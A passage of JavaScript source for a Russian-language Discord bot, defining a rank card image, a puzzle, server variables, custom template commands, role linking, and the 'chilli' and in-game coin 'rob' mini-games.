      ctx.lineTo(20, 20);
      ctx.lineTo(880, 20);
      ctx.stroke();

      ctx.restore();
      ctx.save();

      ctx.strokeStyle = "rgba(119,119,119, 0.7)";
      ctx.beginPath();
      ctx.moveTo(195, 60);
      ctx.lineTo(195, 165);
      ctx.stroke();

      ctx.fillStyle = "#080918";
      ctx.beginPath();
      ctx.shadowColor = "#999";
      ctx.shadowBlur = 10;
      ctx.arc(110, 100, 45, 0, Math.PI*2, true);
      ctx.fill();
      ctx.clip();

      ctx.globalCompositeOperation = 'source-in';

      avatar = await canvas.loadImage(avatar);
      ctx.drawImage(avatar, 0, 0, 90, 90);
      ctx.restore();

      ctx.font = `bold 20px ${ FONT_FAMILY }`;
      const { width: levelFontWidth } = ctx.measureText(user.level + " уровень");
      ctx.fillText(user.level + " уровень", 110 - levelFontWidth / 2, 170);

      ctx.strokeStyle = "rgba(119,119,119, 1)";
      ctx.beginPath();
      ctx.moveTo(100, 178);
      ctx.lineTo(120, 178);
      ctx.stroke();

      ctx.restore();
      ctx.save();

      ctx.beginPath();
      ctx.font = `bold 5px "${ FONT_FAMILY }", 'sans-serif'`;
      ctx.fillStyle = "#b0b4b0";
      width = {font: Math.min(545 / ctx.measureText(member.username).width * 5, 180)};





      ctx.font = `bold ${ width.font }px "${ FONT_FAMILY }", "sans-serif"`;

      width.textHeight = ctx.measureText(member.username).actualBoundingBoxAscent + ctx.measureText(member.username).actualBoundingBoxDescent;

      let expCanvas = canvas.createCanvas(670, 165);
      let ctx2 = expCanvas.getContext("2d");

      ctx2.textBaseline = "middle";
      ctx2.fillStyle = "#b0b4b0";

      ctx2.font = ctx.font;
      expLine = (670 - ctx.measureText(member.username).width) / 2;

      ctx2.fillText(member.username, expLine, 60);
      ctx2.globalCompositeOperation = "source-atop";

      ctx2.fillStyle = (user.profile_color) ? "#" + user.profile_color : "#0c0";
      ctx2.fillRect(expLine, (165 - width.textHeight) / 2, user.exp / (user.level * 45) * (670 - expLine * 1.8), width.textHeight * 1.5);

      gradient = ctx.createLinearGradient(expLine, 165, (670 - expLine * 1.8), 0);
      gradient.addColorStop(0.2, "rgba(0, 0, 0, 0.5)");
      gradient.addColorStop(0.4, "rgba(0, 0, 0, 0.2)");
      gradient.addColorStop(0.8, "rgba(0, 0, 0, 0)");
      ctx2.fillStyle = gradient;
      ctx2.fillRect(expLine, (165 - width.textHeight) / 2, 670, width.textHeight * 1.2);

      ctx.drawImage(expCanvas, 200, 30);


    let image = canv.toBuffer("image/png");
    msg.msg(new Discord.MessageAttachment(image, "level.png"), {embed: true, delete: 1_000_000});
  }, {delete: true, dev: true}, "уровень rang rank ранг ранк lvl лвл"),

  puzzle: new Command(async (msg, op) => {
    return;
    let
      i = 9,

      canv = canvas.createCanvas(300, i * 30 + 30),
      ctx = canv.getContext("2d"),

      rules = {"!111": "3", "!222": "32", "!11": "21", "!22": "22", "!33": "23", "!1": "11", "!2": "12", "!3": "13"},
      last = String( random(1, 1) );


      ctx.font = "bold 20px sans-serif";
      ctx.shadowBlur = 2;
      ctx.shadowColor = "rgba(19, 202, 36, 0.3)";
      ctx.shadowOffsetX = 3;
      ctx.shadowOffsetY = 3;

      while (i > 0){
        let input = "";
        i--;
        ctx.fillStyle = "#13ca24";
        ctx.fillText(last, 150 - ctx.measureText(last).width / 2, canv.height - (i + 1) * 30);
        while (last) {
          let found = Object.keys(rules).find(e => last.startsWith( e.slice(1) ));
          input += rules[found];
          last = last.slice(found.length - 1);
          ctx.fillStyle = "#f2fafa";
          ctx.fillRect(random(canv.width), random(canv.height), 2, 2);
          ctx.fillRect(random(canv.width), random(canv.height), 1, 1);
          ctx.fillStyle = "rgba(242, 250, 250, 0.5)";
          ctx.fillRect(random(canv.width), random(canv.height), 3, 3)
        }

        last = input;
      }
      ctx.shadowColor = "rgba(150, 75, 0, 0.3)";
      ctx.fillStyle = "#964B00";
      ctx.fillText("???", 134, canv.height);

      ctx.strokeStyle = "rgba(19, 202, 36, 0.5)";
      ctx.shadowColor = "rgba(19, 202, 36, 0.3)";
      ctx.beginPath();

      ctx.moveTo(150, 7.5);
      ctx.lineTo(50, canv.height - 20);
      ctx.lineTo(135, canv.height - 20);
      ctx.lineTo(135, canv.height - 24);

      ctx.moveTo(150, 7.5);
      ctx.lineTo(250, canv.height - 20);
      ctx.lineTo(165, canv.height - 20);
      ctx.lineTo(165, canv.height - 24);

      ctx.stroke();

      ctx.shadowColor = "rgba(255, 255, 0, 0.3)";
      ctx.fillStyle = "#ff0";
      ctx.beginPath();
      ctx.moveTo(150, 0);
      ctx.lineTo(145, 5);
      ctx.lineTo(150, 10);
      ctx.lineTo(155, 5);
      ctx.closePath();
      ctx.fill();

      let image = new Discord.MessageAttachment( canv.toBuffer("image/png"), "pazzle.png" );
      let reward = (getTime() - 1607558400000) / 500000;
      reward = reward - (reward % 5);

      let message = await msg.msg("Новогодняя ёлочка", {description: `Решите головоломку и получите награду!\nЗамените "???", в конце ёлочки, на число, чтобы ответить правильно, обязательно используйте голову.\nДля ввода ответ, нажмите реакцию ниже*. Удачи.\nТекущая награда: **${reward}** <:coin:637533074879414272>`, image: "attachment://pazzle.png", files: image, color: "f2fafa", author: {name: msg.author.username, iconURL: msg.author.avatarURL()}});
      let react = await message.awaitReact({user: msg.author, type: "all"}, "✅");

      if (!react) return message.delete();

      let answer = await msg.channel.awaitMessage(msg.author, {message: "3... 2.. 1.! Пробуем...!", embed: {color: "f2fafa"}});

      answer = answer.content;
      if (isNaN(answer)) return msg.msg("Ответом должно быть число!", {color: "ff0000", delete: 5000});

      if (answer == last) {
        msg.author.data.coins += reward;
        return msg.msg("И это... Правильный ответ! Ваша награда уже у вас в карманах!", {delete: 5000});
      }

      let percent = Math.round((1 - similarity(last, answer) / last.length) * 100);
      let phrase;
      switch (true) {
        case percent < 10: phrase = `Ответ не верный.\nСовет: в ответе ровно **${last.length}** цифр`;
        break;
        case percent < 25: phrase = `Похоже вы встали на верный путь и скоро разгадаете эту задачку, не сдавайтесь!`;
        break;
        case percent < 80: phrase = `На ${percent}% вы ответили — правильно! Интересный факт: картошка — это фонарь, лишь на 11.76%.`;
        break;
        case percent < 101: phrase = `Осталось совсем чуть-чуть! У вас получится, ||но ответ всё ещё не верный.||`;
      }
      message.delete();
      msg.msg(phrase, {color: "f2fafa", delete: 9000});

  }, {delete: true, type: "delete" /*, cooldown: 3600, try: 1*/}, "пазл ёлка елка"),

  variables: new Command(async (msg, op) => {
    const isAdmin = !op.member.wastedPermissions(32)[0];
    const manager = new GuildVariablesManager(msg.guild.id);
    const targetName = (message) => target === "guild" ? "Сервера" : `Пользователя ${message.mentions.users.first().toString()}`;

    let target = op.args.match(/^(?:<@!?\d{17,19}>|guild|сервер|server)/i);
    if (target) {
      op.args = op.args.replace(target[0], "").replace(/\s{1,}/g, " ").trim();
      target = target[0].startsWith("<") ? target[0].match(/\d{17,19}/)[0] : "guild";

      if (!op.args){
        let fields = manager.variables[target] ?
          Object.entries(manager.variables[target]).map(([name, value]) => ({name, value}))
          :
          [{name: "Тут пусто", value: "Возможно, когда-то здесь что-то появится"}];

        msg.msg("Свойства", {
          color: "ffc135",
          description: `Все переменные ${targetName(msg)}`,
          footer: {text: `(${manager.variables[target] ? Object.keys(manager.variables[target]).length : 0}/20)`},
          fields,
        });
        return;
      }

      if (!isAdmin){
        msg.msg("Вы должны обладать правами администратора", {color: "ff0000", delete: 4000});
        return;
      }

      let [name, ...value] = op.args.replace(/\s{1,}/g, " ").split(" ");
      value = value.join(" ");

      let output = manager[value ? "set" : "get"](target, name, value);
      if (output.err){
        let err;
        switch (output.err) {
          case 1:
            err = "Имя переменной содержит нежелательные символы";
            break;
          case 2:
            err = "Достигнут максимум: 20 свойств на персону";
            break;
          default:
          err = "Неизвестный тип ошибки";
        }
        msg.msg(err, {color: "ff0000", delete: 4000});
        return;
      }

      return msg.msg("Переменная " + (value ? "изменена" : "получена"), {description: value ? `Переменная \`${output.name}\` ${targetName(msg)} установлена в значение ${output.value}` : `Переменная \`${output.name}\` у ${targetName(msg)} сейчас уставновлена в значении ${output.value}`});
    }

    let youre = manager.variables[msg.author.id] ? Object.keys(manager.variables[msg.author.id]) : [];
    manager.embed = {
      description: `Количество переменных сервера: ${Object.values(manager.variables).reduce((acc, last) => acc + Object.keys(last).length, 0)}${youre.length ? "\nУ вас свойств: " + youre.length : ""}\n\n🐵 Установить новую переменную.\n🙊 Получить значение переменной.\n\n🐭 Открыть Список.\n🦅 Найти по названию.\n🐣 Топ пользователей по свойству.\n🐲 Удалить переменную.`,
      color: "ffc135"
    };
    let baseReactions = ["🐭", "🦅", "🐣"];
    if (isAdmin){
      baseReactions.unshift("🐵", "🙊");
      baseReactions.push("🐲");
    }

    manager.interface = await msg.msg("Окно управления переменными сервера", manager.embed);
    manager.embed.edit = true;
    delete manager.embed.description;

    let
      react, answer, fields = [],
      page = 0, pages = [];

    let output;
    while (true) {
      react = await manager.interface.awaitReact({user: msg.author, type: "one"}, ...baseReactions, (page != 0 ? "640449848050712587" : null), ((pages[1] && page != pages.length - 1) ? "640449832799961088" : null));
      switch (react) {
        case "🐵":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Для установки...", embed: {description: "Упомяните пользователя, укажите имя переменной и её значение, в указанном порядке.\nВместо упоминания можете использовать слово \"сервер\"\nНазвание переменной должно состоять из одного слова."}});
          if (!answer){
            return;
          }

          target = answer.content.match(/^(<@!?(\d{17,19})>|guild|сервер|server)/i);
          if (!target){
            msg.msg("Не указана цель для которой нужно установить значение", {color: "ff0000", delete: 5000});
            break;
          }

          answer.content = answer.content.replace(target[0], "").replace(/\s{1,}/g, " ").trim();
          target = target[0].startsWith("<") ? target[0].match(/\d{17,19}/)[0] : "guild";
          answer.content = answer.content.replace(/\s{1,}/g, " ").split(" ");

          if (!answer.content[1]){
            msg.msg("Должно быть указано имя и значение", {color: "ff0000", delete: 3000});
            break;
          }

          output = manager.set(target, answer.content[0], answer.content.slice(1).join(" "));
          if (output.err){
            let err;
            switch (output.err) {
              case 1:
                err = "Имя переменной содержит нежелательные символы";
                break;
              case 2:
                err = "Достигнут максимум: 20 свойств на персону";
                break;
              default:
                err = "Неизвестный тип ошибки";
            }
            msg.msg(err, {color: "ff0000", delete: 4000});
            return;
          }

          msg.msg("Переменная изменена:", {description: `Переменная \`${output.name}\` ${targetName(answer)} установлена в значение ${output.value}`});
          fields = [{name: "Вы успешно установили переменную", value: `🐵`}];
          break;

        case "🙊":
          answer = await msg.channel.awaitMessage(msg.author, {message: "Для установки...", embed: {description: "Упомяните пользователя, укажите имя переменной и её значение, в указанном порядке.\nВместо упоминания можете использовать слово \"сервер\"\nНазвание переменной должно состоять из одного слова."}});
          if (!answer){
            return;
          }

          target = answer.content.match(/^(<@!?(\d{17,19})>|guild|сервер|server)/i);
          if (!target){
            msg.msg("Не указана цель, значение свойства которой нужно получить", {color: "ff0000", delete: 5000});
            break;
          }

          answer.content = answer.content.replace(target[0], "").replace(/\s{1,}/g, " ").trim();
          target = target[0].startsWith("<") ? target[0].match(/\d{17,19}/)[0] : "guild";
          answer.content = answer.content.replace(/\s{1,}/g, " ").split(" ");

          if (!answer.content[0]){
            msg.msg("Должно быть указано имя свойства", {color: "ff0000", delete: 3000});
            break;
          }

          output = manager.get(target, answer.content[0]);
          fields = [{name: `Переменная ${targerName(answer)} ${output.name}...`, value: `сейчас установлена в значении \`${output.value}\`🐵`}];
          break;

        case "🐭":
          fields = Object.entries(manager.list()).map(([name, count]) => ({name, value: `Повторяется: ${ending(count, "раз", "", "", "а")}`}));
          break;

        case "🦅":
          answer = await msg.channel.awaitMessage(msg.author, {message: `Введите имя переменной, для её поиска среди пользователей`, description: ""});
          if (!answer){
              return;
          }
          fields = Object.entries(manager.search(answer.content)).map(([id, value], i) => ({name: `${id === "guild" ? "Сервер" : msg.guild.members.cache.get(id).displayName}:`, value: `\`${value}\``}));
          break;

        case "🐣":
          answer = await msg.channel.awaitMessage(msg.author, {message: `Введите имя переменной для отображения по ней ТОП-а пользователей`, description: ""});
          if (!answer){
              return;
          }

          fields = manager.top(answer.content).filter(e => e[0] != "guild").map(([id, value], i) => ({name: `${i + 1}. ${msg.guild.members.cache.get(id).displayName}`, value}));
          break;

        case "🐲":
          answer = await msg.channel.awaitMessage(msg.author, {message: `Введите имя переменной, она будет удалена у всех пользователей`, embed: {description: "Через пробел вы можете указать цель, тогда свойство удалится только у неё"}});
          target = answer.content.match(/(?:<@!?\d{17,19}>|guild|сервер|server)$/i);
          if (target){
            answer.content = answer.content.replace(target[0], "").replace(/\s{1,}/g, " ").trim();
            target = target[0].startsWith("<") ? target[0].match(/\d{17,19}/)[0] : "guild";
          }

          output = manager.remove(answer.content, target);
          fields = [{name: "Удалено", value: `Удалено ${ending(+output, "свойств", "", "о", "а")} с названием ${answer.content}`}];
          break;


        default: return;
      }
      if (react != "640449848050712587" && react != "640449832799961088"){
        page = 0;
        pages = [];
        while (fields.length) pages.push(fields.splice(0, 10));
      }
      fields = (pages[0]) ? pages[page] : [{name: "Здесь пусто", value: "А здесь и вправду пусто..."}];
      manager.embed.footer = (pages[1]) ? {text: `Страница: ${page + 1} / ${pages.length}`} : null;
      manager.embed.fields = fields;

      manager.interface.msg(react + " Окно управления переменными сервера", manager.embed);
    }

  }, {delete: true, dm: true, Permissions: 256, type: "guild"}, "variable вар var переменная переменные"),

  guildcommand: new Command(async (msg, op) => {
    let heAccpet = await accept("guildCommand", {description: "Здравствуйте, эта команда очень универсальна и проста, если её не боятся конечно. Она поможет вам создать свои собсвенные команды основанные на \"[Шаблонных строках](https://discord.gg/7ATCf8jJF2)\".\nЕсли у вас возникнут сложности, обращайтесь :)", message: "Команда для создания команд 🤔"}, msg.channel, op.user);
    if (!heAccpet) return;

    let answer, react;
    let commands = msg.guild.data.commands || (msg.guild.data.commands = {});


    answer = await msg.channel.awaitMessage(msg.author, {message: "Шаг 1. Введите уникальное название команды", embed: {description: `Оно будет использоватся для вызова.\nСделайте его понятным для пользователей :)`, time: 1000000}});
    if (!answer) return false;
    answer.content = answer.content.replace(/[^a-zа-яїё_$]/gi, "").toLowerCase();

    let cmd;
    if (commands[answer.content]) {
      let oldCommand = await msg.msg("Команда с таким названием уже существует, вы хотите перезаписать её?", {description: "✏️ — Хочу просто изменить текст этой команды\n🗑️ — Просто удалите это!"});
      react = await oldCommand.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456", "✏️", "🗑️");
      oldCommand.delete();
      if (react == 763807890573885456) return msg.msg("Создание команды отменено", {delete: 4500}), false;
      else cmd = commands[answer.content] = {name: answer.content, author: msg.author.id};

      if (react == "✏️") {
        answer = await msg.channel.awaitMessage(msg.author, {message: "Введите новое сообщение"});
        if (!answer) return;
        cmd.message = answer.content;
        return msg.msg("Новое описание установлено!", {delete: 5000});
      }

      if (react == "🗑️") {
        delete commands[answer.content];
        return msg.msg("Команда была полностью удалена.", {delete: 5000});
      }
    }
    else cmd = commands[answer.content] = {name: answer.content, author: msg.author.id};

    while (true) {
      answer = await msg.channel.awaitMessage(msg.author, {message: "Шаг 2. Введите сообщение содержащее шаблоны `!{}`", embed: {description: `Интересные примеры:\n_Бросок кубика! Выпало: \\!{bot.methods.random(6)}._\nНа этом сервере \\!{guild.members.count} участников.\nНе бойтесь экспериментировать, это самый простой путь познания такой простой вещи как шаблоны, так же как и лего.`, time: 3600000}})
      if (!answer) return false;
      cmd.message = answer.content;

      if (!answer.content.match(/!\{.+?\}/g)) {
        let notTemplate = await msg.msg("В сообщении отсуствуют шаблоны, вы уверены, что хотите продолжить без них?");
        react = await notTemplate.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");
        notTemplate.delete();
        if (react == 685057435161198594) break;
      }
      break;
    }

    let message = await msg.msg("Шаг 3. Вашему сообщению нужен эмбед?", {description: `Подразумивается эмбед-обёртка, цвет и заглавие`});
    react = await message.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");
    message.delete();
    if (react == 685057435161198594){
      answer = await msg.channel.awaitMessage(msg.author, {message: "Укажите оглавление эмбеда", embed: {description: `Оглавление — голова эмбед сообщения...\nК слову, она также поддерживает шаблоны`, time: 1200000}});
      if (!answer) return false;
      cmd.title = answer.content;

      answer = await msg.channel.awaitMessage(msg.author, {message: "Введите цвет в HEX формате", embed: {description: `HEX — #ff0000, где первые два числа в 16-значной системе (0,1,2,...,e,f) — красный, потом зеленый и синий`, time: 1200000}});
      if (!answer) return false;
      cmd.color = answer.content.replace("#", "");
    }

   message = await msg.msg("Шаг 4. Перезарядка команды", {description: `Укажите кулдаун в секундах, на использование команды, этот пункт можно пропустить.`});
   while(true) {
     answer = await reactOrMessage(message, msg.author, "❌");
     if (!answer) return false;
     if (answer != "❌"){
       if (isNaN(answer.content)) {
         msg.msg("Указано не число", {color: "ff0000", delete: 3000});
         continue;
       }
       cmd.cooldown = answer.content * 1000;
       break;
     }
     break;
  }
  message.delete();

  message = await msg.msg("Шаг 5. Последний.", {description: "Нужно ли удалять сообщения вызова команды?"});
  react = await message.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");
  if (react == "685057435161198594") cmd.delete = true;
  message.delete();

  msg.msg("Готово!", {description: `Вы создали команду \`!${cmd.name}\`. Самое время её опробовать 😋`});
  }, {Permissions: 8, delete: true, type: "guild"}, "guildcommands createcommand команда"),

  role: new Command(async (msg, op) => {
    let heAccpet = await accept("tieRoles", "С помощью этой команды администраторы серверов могут дать своим модераторам возможность выдавать или снимать определенные роли, не давая создавать новые или управлять старыми", msg.channel, op.user);
    if (!heAccpet) {
      return;
    }

    let tieRoles = msg.guild.data.tieRoles || (msg.guild.data.tieRoles = {});
    const guildRoles = {};

    // Фильтруем роли-контроллеры существуют ли они.
    Object.keys(tieRoles).forEach((control) => {
      controlRole = guildRoles[control] = msg.guild.roles.cache.get(control);
      if (!controlRole) delete tieRoles[control];
    });
    // Фильтруем контролируемые
    Object.entries(tieRoles).forEach(([control, roles]) => tieRoles[control] = roles.filter(e => {
      return guildRoles[e] = guildRoles[e] || msg.guild.roles.cache.get(e);
    }));


    if (op.memb){
      let memb = op.memb;
      let myControled = op.member.roles.cache.array().filter(e => Object.keys(tieRoles).includes(e.id)).map(e => e.id);
      let [mention, id] = op.args.split(" ");

      let controledRoles = new Set();
      Object.entries(tieRoles).filter(([control, roles]) => myControled.includes(control)).map(([control, roles]) => roles).forEach(e => controledRoles.add(e));
      controledRoles = [...controledRoles];

      if (!controledRoles.length) {
        msg.msg("На этом сервере нет ролей, которыми вы могли бы управлять", {color: "ff0000", delete: 5000});
        return;
      }

      if (!id) {
        numberReactions = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"].slice(0, controledRoles.length);
        let message = await msg.msg("Вы не указали айди роли", {description: `Выберите доступную вам роль, чтобы снять или выдать её пользователю ${memb}\n${controledRoles.map((id, i) => `${numberReactions[i]} ${guildRoles[id]}`).join("\n")}`, color: "00ff00"});
        let react = await message.awaitReact({user: msg.author, type: "all"}, ...numberReactions);
        message.delete();
        if (react) id = controledRoles[numberReactions.indexOf(react)];
      }

      if (!controledRoles.includes(id)) {
        msg.msg("Отсуствуют связанные роли", {description: `Вы не можете выдавать ${guildRoles[id]}, так как у вас нет связанных с ней контролирующих ролей.\nИх могут создавать и редактировать администраторы сервера командой \`!role\``});
        return;
      }

      memb = msg.guild.member(memb);
      let heHas = memb.roles.cache.find(e => e.id == id);
      memb.roles[heHas ? "remove" : "add"](id);
      msg.msg("Роли участника успешно изменены", {description: `${heHas ? `У ${memb} отняли` : `${memb} получил`} роль ${guildRoles[id]}`, delete: 5000});
      return;
    }


    let page = 0;
    let pages = [];

    const isAdmin = !op.member.wastedPermissions(8)[0];
    const reactions = [
      {emoji: "640449848050712587", filter: () => page != 0},
      {emoji: "640449832799961088", filter: () => pages[1] && page !== pages.length - 1},
      {emoji: "⭐", filter: () => isAdmin},
      {emoji: "❌", filter: () => isAdmin && Object.keys(tieRoles).length !== 0}
    ]


    const createPages = () => pages = Object.entries(tieRoles).map(([control, roles]) => `[${guildRoles[control]}]\n${roles.map(e => `• ${guildRoles[e]}`).join("\n")}`);
    createPages();

    if (pages.length === 0) {
      pages.push("На сервер нет ни одной связи — список пуст.");
    }

    const embed = {
      title: "Связанные роли",
      description: pages[0],
      footer: {
        text: `Чтобы выдать пользователю роль, используйте !роль @упоминание\n${isAdmin ? "С помощью реакций ниже создайте новую связь или удалите старые." : ""}${pages[1] ? `\nСтраница: ${page + 1} / ${pages.length}` : ""}`
      }
    };






    let message = await msg.msg(embed.title, embed);
    embed.edit = true;

    let react;
    while (true) {
      react = await message.awaitReact({user: msg.author, type: "all"}, ...reactions.filter( r => r.filter() ).map( r => r.emoji ));
      switch (react) {
        case "640449832799961088": page++;
        break;
        case "640449848050712587": page--;
        break;

        case "⭐":
          let controller = await msg.channel.awaitMessage(msg.author, {message: "Укажите айди роли", embed: {description: "Она сможет выдавать или снимать участникам позже указанные роли"}});
          if (!controller){
            continue;
          }
          controller = msg.guild.roles.cache.get(controller.content);
          if (!controller){
            msg.msg(`Неудалось найти на сервере роль с айди ${controller.content}`, {delete: 8000});
            continue;
          }

          let rolesList = await msg.channel.awaitMessage(msg.author, {message: "С чём связать..?", embed: {description: `Через пробел укажите айди всех ролей, которыми будет управлять ${controller.name}`}});
          if (!rolesList){
            continue;
          }
          rolesList = rolesList.content.split(" ").map(e => msg.guild.roles.cache.get(e)).filter(e => e);
          if (rolesList.length === 0){
            msg.msg(`Неудалось найти ни одну из указанных ролей`, {delete: 8000});
            continue;
          }

          tieRoles[controller.id] = tieRoles[controller.id] || [];
          rolesList.forEach(e => {
            guildRoles[e.id] = e;
            if (e.id in tieRoles[controller.id]){
              return;
            }
            tieRoles[controller.id].push(e.id);
          });
          guildRoles[controller.id] = controller;
          msg.msg(`Успешно добавлено ${ending(rolesList.length, "связ", "ей", "ь", "и")}`, {footer: {text: "Связь установлена, а главное никакой мистики!"}, description: rolesList.map(role => `• ${role}`).join("\n"), delete: 12000});
          createPages();
        break;

        case "❌":
        let id = Object.keys(tieRoles)[page];
        let deleteRolesMessage = await msg.msg(`Вы уверены, что хотите удалить..?`, {description: `Вы очистите все связи с ролью ${guildRoles[id]}`});
        react = await deleted.awaitReact({user: msg.author, type: "all"}, "685057435161198594", "763807890573885456");
        deleted.delete();

        if (react == "685057435161198594"){
          delete tieRoles[id];
          if (pages[0]){
            pages = ["На сервер нет ни одной связи, вы удалили последнюю — список пуст."];
          }
          msg.msg(`Связь #${page + 1} успешно удалена.`, {delete: 5000});
          pages = pages.splice(page, 1);
          page = Math.max(page - 1, 0);
          createPages();
        }
        break;

        default:
        return message.delete();
      }
      embed.description = pages[page];
      if (pages[1]) {
        embed.footer.text = embed.footer.text.split("\n").slice(0, 2).join("\n").concat(`\nСтраница: ${page + 1} / ${pages.length}`);
      }
      message.msg("Связанные роли", embed);
    }
  }, {delete: true, cooldown: 3, try: 3, type: "guild"}, "роль roles роли"),

  chilli: new Command(async (msg, op) => {
    let memb = op.memb;
    let chilli = msg.channel.chilli && msg.channel.chilli.find(chilli => chilli.current === msg.author.id);
    setTimeout(() => msg.delete(), 30000);

    const addName = (memb) => {
      let newName = memb.displayName + "(🌶)";
      memb.setNickname(newName).catch(() => {});
    }
    const removeName = (memb) => {
      let newName = memb.displayName.replace(/\(🌶\)/g, "").trim();
      memb.setNickname(newName).catch(() => {});
    }


    if (!chilli && !msg.author.data.chilli) {
      return msg.msg("Для броска у вас должен быть чилли 🌶️\nКупить его можно в !лавке", {color: "ff0000", delete: 5000, footer: {iconURL: "https://emojitool.ru/img/microsoft/windows-10-may-2019-update/hot-pepper-2179.png", text: "Безудержный перчик™"}});
    }
    if (msg.channel.chilli && msg.channel.chilli.find(e => e.id == memb.id)) {
      return msg.msg("Вы не можете бросить перец в участника с перцем в руке", {color: "ff0000", footer: {iconURL: "https://emojitool.ru/img/microsoft/windows-10-may-2019-update/hot-pepper-2179.png", text: "Перчик™"}});
    }
    if (memb.bot) {
      return msg.msg("🤬🤬🤬", {description: "it's hot fruitctttt", color: "ff0000", footer: {iconURL: "https://emojitool.ru/img/microsoft/windows-10-may-2019-update/hot-pepper-2179.png", text: "Кое-кто бросил перец в бота.."}});
    }

    if (chilli){
      chilli.current = memb.id;
      chilli.players[msg.author.id] = ++chilli.players[msg.author.id] || 1;
      removeName(op.member);
      addName(msg.guild.member(memb));

      msg.msg(["Бросок!", "А говорят перцы не летают..."].random(), {
        description: `Вы бросили перчиком в ${ memb }`,
        author: {name: msg.author.username, iconURL: msg.author.avatarURL()},
        footer: {iconURL: "https://emojitool.ru/img/microsoft/windows-10-may-2019-update/hot-pepper-2179.png", text: "Безудержный перчик™"},
        delete: 7000
      });

      chilli.rebounds++;
      clearTimeout(chilli.kickTimeout);
      chilli.kickTimeout = setTimeout(e => (msg.channel.chilli && msg.channel.chilli.includes(chilli) && chilli.timeout._onTimeout(), clearTimeout(chilli.timeout)), 5500);
      return;
    }

    const confirm = await msg.msg("Подготовка", {description: `${ msg.author.username }, вы бросили перец, нажмите "❌" чтобы отменить`, reactions: ["❌"]});

    await delay(2000);
    confirm.delete();

    const confirmed = !confirm.reactions.cache.get("❌").users.cache.has(msg.author.id);
    if (!confirmed){
      msg.msg("Отменено 🌶️", {delete: 7000});
      return;
    }
      


    msg.author.data.chilli--;
    msg.channel.chilli = msg.channel.chilli || [];

    msg.msg(`Перец падает! Перец падает!!`, {description: `\*перец упал в руки ${memb.toString()}\*\nЧтобы кинуть обратно используйте \`!chilli @memb\``, author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, footer: {iconURL: "https://emojitool.ru/img/microsoft/windows-10-may-2019-update/hot-pepper-2179.png", text: "Безудержный перчик™"}});
    addName(msg.guild.member(memb));
    let ms = random(30, 37) * 1000;

    chilli = { timestamp: getTime() + ms, players: {}, current: memb.id, rebounds: 0, author: msg.author.id };
    chilli.players[ memb.id ] = 0;
    chilli.players[ msg.author.id ] = 0;

    msg.channel.chilli.push(chilli);

    chilli.timeout = setTimeout(() => {
      let member = msg.guild.members.cache.get(chilli.current);

      Object.keys(chilli.players)
        .forEach(id => client.users.cache.get(id).action("chilliBooh", {boohTarget: member, chilli, msg, op}));

      msg.msg("Бах! Перчик взорвался!", {
        description: `Перец бахнул прямо у ${ member }\nИгра окончена.\nБыло совершено отскоков: ${ chilli.rebounds }`,
        fields: Object.entries(chilli.players).sortBy("1", true).map(([id, score]) => ({name: msg.guild.members.cache.get(id).user.username, value: `Счёт: ${ score }`})).slice(0, 20),
        footer: {iconURL: "https://emojitool.ru/img/microsoft/windows-10-may-2019-update/hot-pepper-2179.png", text: "Безудержный перчик™"}
      });
      removeName(member);
      msg.channel.chilli.splice(msg.channel.chilli.indexOf(chilli), 1);


      if (!msg.channel.chilli[0]) {
        delete msg.channel.chilli;
      }
    }, ms);

  }, {memb: true, cooldown: 3.5, try: 2, type: "other", hidden: true}, "перчик перец"),

  rob: new Command(async (msg, op) => {
    let memb = op.memb;

    if (!op.user.thiefGloves)
      return msg.msg("Для использования этой команды нужно купить перчатки", {description: "Их, иногда, можно найти в !лавке, по цене 700 коинов", color: "ff0000", delete: 7000});


    let [count, combo] = op.user.thiefGloves.split("|");

    if (memb.id == msg.author.id)
      return msg.msg("Среди бела-дня вы напали на себя по непонятной причине", {description: "Пока вы кричали \"Вор! Вор! Ловите вора!\", к вам уже подъежала лесная скорая", image: "https://images-ext-2.discordapp.net/external/a8GTXB_QWUkoGA0rnJjqcPdipF0WsvETvU1uJugcjqE/https/media.discordapp.net/attachments/605085718947299389/802061414512066580/a79334c48d5ec868f217cf2aa985e9ae5770c251r1-1520-720v2_00.png"});

    if (!count || +count < 1)
      return msg.msg("Вы потеряли все свои перчатки, сначала купите новые", {color: "ff0000", delete: 7000});

    if (memb.bot)
      return msg.msg(`В попытках ограбить бота ${memb.username} вы не учли скорость его реакции.`, {description: "К счастью роботы не обижаются...", color: "ff0000"});


    let membWins = memb.data.thiefWins |= 0;
    let k = (1 + (membWins > 0 ? membWins * 1.2 : Math.max(membWins, -10) * 0.07));

    if (memb.data.voidMonster){
      k *= 12;
    }


    let rand = ~~(random(21, 49) * (combo / 10 + 1) * k) + memb.data.level;

    if (memb.presence.status == "offline")
      return msg.msg("Вы не можете ограбить пользователя, который в оффлайн", {color: "ff0000", delete: 7000});

    let message = await memb.msg("❕ Вы были ограблены", {description: `Ловкий вор средь бело-дня украл у вас ${rand} <:coin:637533074879414272>\nУ вас есть минута, нажмите реакцию ниже, чтобы среагировать, догнать преступника и вернуть коины`, color: "ff0000"}).catch(e => {});
    if (!message){
      msg.author.msg("Не удалось ограбить пользователя", {description: "Скорее всего у участника включена функция \"Не принимать личные сообщения от всех участников сервера\" Из-за чего бот не может оповестить о краже..."});
      return;
    }


    memb.data.coins -= rand;
    op.user.coins += rand;
    op.user.CD_39 += 7200000;

    msg.msg("Ограблено и украдено, теперь бежать", {description: `Вы успешно украли ${rand} <:coin:637533074879414272> у ${memb.username}, но это ещё не конец, если вас догонят, награбленное вернётся к владельцу.\nУ ${memb.username} есть минута, чтобы среагировать, в ином случае добыча останется с вами навсегда.`, author: {name: msg.author.username, iconURL: msg.author.avatarURL()}, footer: {text: "Серия ограблений: " + ++combo}, delete: 10000});
    let react = await message.awaitReact({user: memb, type: "none", time: 60000}, "❗");


    const
      note         = op.args.slice(op.memb.toString().length + 1).trim(),
      monsterHelps = memb.data.voidMonster && !(memb.data.CD_39 > getTime()),
      hurt         = memb.data.thiefWins < -5,
